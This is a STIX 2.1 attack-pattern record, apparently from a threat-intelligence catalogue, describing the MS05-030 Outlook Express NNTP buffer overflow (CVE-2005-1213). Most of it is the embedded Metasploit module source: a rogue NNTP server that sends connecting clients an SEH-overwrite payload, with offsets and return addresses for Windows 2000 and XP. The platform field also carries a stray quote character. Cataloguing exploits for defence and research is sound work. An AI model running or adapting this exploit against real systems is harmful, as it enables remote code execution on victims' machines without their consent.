{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e18e09a7-e9c6-4f06-b69e-c48c26ff60d4",
    "created": "2024-08-14T16:35:16.510438Z",
    "modified": "2024-08-14T16:35:16.510443Z",
    "name": "MS05-030 Microsoft Outlook Express NNTP Response Parsing Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the news reader of Microsoft Outlook Express. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/nntp/ms05_030_nntp.rb",
            "external_id": "ms05_030_nntp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1213"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS05-030 Microsoft Outlook Express NNTP Response Parsing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the news reader of Microsoft\n        Outlook Express.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-1213' ],\n          [ 'OSVDB', '17306' ],\n          [ 'BID', '13951' ],\n          [ 'MSB', 'MS05-030' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\",\n          'MaxNops'  => 0,\n          'StackAdjustment' => -3500,\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 English SP0-SP4', { 'Offset' => 9624, 'Ret' => 0x75022ac4 }],\n          ['Windows XP English SP0/SP1',   { 'Offset' => 9596, 'Ret' => 0x71aa2461 }],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2005-06-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The NNTPServer daemon port to listen on\", 119 ])\n      ])\n  end\n\n  def on_client_connect(client)\n    yup = \"200\\r\\n\"\n\n    client.put(yup)\n    client.put(yup)\n  end\n\n  def on_client_data(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    filler =  \"215 list\\r\\n\" + \"group \"\n    filler << rand_text_english(target['Offset'])\n    seh    =  generate_seh_payload(target.ret)\n    sploit =  filler + seh + \" 1 y\\r\\n\\.\\r\\n\"\n\n    print_status(\"Sending #{sploit.length} bytes to #{client.getpeername}:#{client.peerport}...\")\n    client.put(sploit)\n\n    handler\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-06-14",
    "x_mitre_platforms": [
        "win'"
    ]
}